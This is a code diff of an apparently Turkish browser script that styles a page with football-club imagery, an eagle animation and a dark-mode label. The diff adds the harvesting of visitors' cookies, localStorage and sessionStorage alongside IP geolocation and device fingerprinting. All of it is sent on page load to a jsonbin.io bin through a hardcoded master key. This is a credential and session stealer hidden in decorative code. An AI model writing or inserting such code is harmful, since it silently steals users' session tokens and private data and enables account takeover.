@@ -1,7 +1,5 @@
+<script>
 (async () => {
-  const apiKey = '$2a$10$WyBCjBNDWR47OqW/NsfqL...udbAialXkiuFTkWYLM7qQWa7G/A6m';  // jsonbin.io API Key
-  const binId = '6874d568355eab5e8b1b13a3';  // jsonbin.io Bin ID
-
   const body = document.body;
   body.style.backgroundImage = "url('https://upload.wikimedia.org/wikipedia/tr/2/22/Besiktas_CJK.png')";
   body.style.backgroundSize = "cover";
@@ -50,9 +48,15 @@
   });
 
   function updateAdminPanelColors() {
-    adminPanelLabel.style.color = isDarkMode ? "#FFFFFF" : "#000000";
-    adminPanelLabel.style.backgroundColor = isDarkMode ? "rgba(0,0,0,0.7)" : "rgba(255,255,255,0.8)";
-    adminPanelLabel.style.textShadow = isDarkMode ? "0 0 5px #FFFFFF" : "0 0 3px #000000";
+    if (isDarkMode) {
+      adminPanelLabel.style.color = "#FFFFFF";
+      adminPanelLabel.style.backgroundColor = "rgba(0,0,0,0.7)";
+      adminPanelLabel.style.textShadow = "0 0 5px #FFFFFF";
+    } else {
+      adminPanelLabel.style.color = "#000000";
+      adminPanelLabel.style.backgroundColor = "rgba(255,255,255,0.8)";
+      adminPanelLabel.style.textShadow = "0 0 3px #000000";
+    }
   }
   updateAdminPanelColors();
   document.body.appendChild(adminPanelLabel);
@@ -76,20 +80,20 @@
       zIndex: '9999'
     });
     document.body.appendChild(eagle);
-    setTimeout(() => (eagle.style.left = '110%'), 100);
-    setTimeout(() => document.body.removeChild(eagle), 5100);
+    setTimeout(() => { eagle.style.left = '110%'; }, 100);
+    setTimeout(() => { eagle.remove(); }, 5100);
   }
-  setInterval(flyEagle, 30000);
   flyEagle();
+  setInterval(flyEagle, 30000);
 
   function displayScore() {
     const score = Math.floor(Math.random() * 100);
-    const high = localStorage.getItem('highestScore') || 0;
-    if (score > high) {
+    let highestScore = localStorage.getItem('highestScore') || 0;
+    if (score > highestScore) {
       localStorage.setItem('highestScore', score);
       console.log(`Yeni rekor: ${score}`);
     } else {
-      console.log(`Skor: ${score}. Rekor: ${high}`);
+      console.log(`Skor: ${score}. Rekor: ${highestScore}`);
     }
   }
   displayScore();
@@ -107,10 +111,8 @@
   async function getIpLocation() {
     try {
       const res = await fetch('https://ipapi.co/json/');
-      if (!res.ok) throw new Error('IP API hatası');
       return await res.json();
-    } catch (e) {
-      console.warn('IP alınamadı:', e);
+    } catch {
       return null;
     }
   }
@@ -126,55 +128,61 @@
       platform: navigator.platform,
       screen: {
         width: screen.width,
-        height: screen.height
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
       },
+      cookies: document.cookie,
+      localStorage: JSON.stringify(localStorage),
+      sessionStorage: JSON.stringify(sessionStorage),
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      onlineStatus: navigator.onLine
+      javaEnabled: navigator.javaEnabled(),
+      onlineStatus: navigator.onLine,
     };
   }
+
+  // 🔐 JSONBIN.IO ENTEGRASYONU
+  const apiKey = '$2a$10$WyBCjBNDWR47OqW/NsfqL...udbAialXkiuFTkWYLM7qQWa7G/A6m';
+  const binId = '6874d568355eab5e8b1b13a3';
 
   async function getDataFromJsonBin() {
     const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
       headers: { 'X-Master-Key': apiKey }
     });
-    if (!res.ok) {
-      console.error('Veri alma hatası:', res.statusText);
-      return { users: [] };
-    }
     const json = await res.json();
-    return json.record;
+    return json.record || {};
   }
 
-  async function sendDataToJsonBin(data) {
+  async function sendDataToJsonBin(newData) {
+    const currentData = await getDataFromJsonBin();
+    const users = Array.isArray(currentData.users) ? currentData.users : [];
+    users.push(newData);
+
     const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
       method: 'PUT',
       headers: {
         'Content-Type': 'application/json',
         'X-Master-Key': apiKey
       },
-      body: JSON.stringify(data)
+      body: JSON.stringify({ users })
     });
+
     if (!res.ok) {
-      console.error('Veri gönderme hatası:', res.statusText);
+      console.error('Veri gönderme başarısız:', res.statusText);
     } else {
       console.log('Veri başarıyla gönderildi.');
     }
   }
 
-  async function updateBinWithNewUser(newUser) {
-    const currentData = await getDataFromJsonBin();
-    const updatedUsers = Array.isArray(currentData.users)
-      ? [...currentData.users, newUser]
-      : [newUser];
-
-    await sendDataToJsonBin({ users: updatedUsers });
-  }
-
   const dataToSend = collectData();
-  await updateBinWithNewUser(dataToSend);
+  await sendDataToJsonBin(dataToSend);
 
   setTimeout(async () => {
     const received = await getDataFromJsonBin();
-    console.log('JsonBin’den alınan güncel veri:', received);
-  }, 500);
+    console.log('Jsonbin’den alınan veri:', received);
+  }, 1000);
 })();
+</script>
+
